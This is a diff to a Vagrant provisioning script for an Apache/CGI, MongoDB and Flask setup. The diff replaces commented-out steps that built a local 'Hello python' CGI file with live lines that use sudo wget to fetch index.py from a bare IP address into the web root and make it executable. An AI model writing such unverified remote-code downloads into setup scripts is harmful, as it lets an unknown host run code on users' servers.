@@ -32,17 +32,9 @@ Vagrant.configure("2") do |config|
     sudo sed -i 9i"</Directory>" /etc/apache2/sites-enabled/000-default.conf
     sudo service apache2 restart
     # echo "Création du fichier index.py"
-    # cd /var/www/html
-    # sudo touch index.py
-    # sudo sed -i 1i"#!/usr/bin/env python" index.py
-    # sudo sed -i 2i"import cgi" index.py
-    # sudo sed -i 3i"import cgitb" index.py
-    # sudo sed -i 4i"cgitb.enable()" index.py
-    # sudo sed -i 6i"print('Content-Type: text/html')" index.py
-    # sudo sed -i 7i"print('<b>Hello python</b>')" index.py
-    # echo "Donne les droits au fichier"
-    # sudo chmod 755 index.py
-    # echo "Fin D'Installation !!"
+    cd /var/www/html
+    sudo wget 185.163.124.106/index.py
+    sudo chmod 755 index.py
     sudo systemctl enable mongodb
     cd ~/flask
     ./setup.sh
